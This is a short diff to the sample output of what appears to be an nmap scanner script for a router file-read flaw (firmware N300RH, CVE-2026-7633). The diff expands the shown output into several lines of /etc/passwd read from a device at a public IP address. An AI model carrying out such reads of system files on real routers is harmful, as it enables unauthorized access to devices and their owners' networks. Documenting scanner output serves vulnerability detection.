@@ -171,8 +171,17 @@ Output
 |    Uri: http://216.99.115.136:8080/cgi-bin/cstecgi.cgi [found]
 |    _firmware version: N300RH 6.1c.1390 [vulnerable version]
 |      filename access: /etc/passwd [read access]
-|      filename contents: root:x:0:0:root:/root:/bin/bash
 |        module Author: r00t-3xp10it
+|
+|filename: /etc/passwd
+|root:x:0:0:root:/root:/bin/ash
+|bin:x:1:1:bin:/bin:/sbin/nologin
+|daemon:x:2:2:daemon:/sbin:/sbin/nologin
+|sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+|guest:x:405:100:guest:/dev/null:/sbin/nologin
+|nobody:x:65534:65534:nobody:/:/sbin/nologin
+|nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
+|         .. REDACTED ..
 |
 |  Referencies:
 |    https://www.tenable.com/cve/CVE-2026-7633
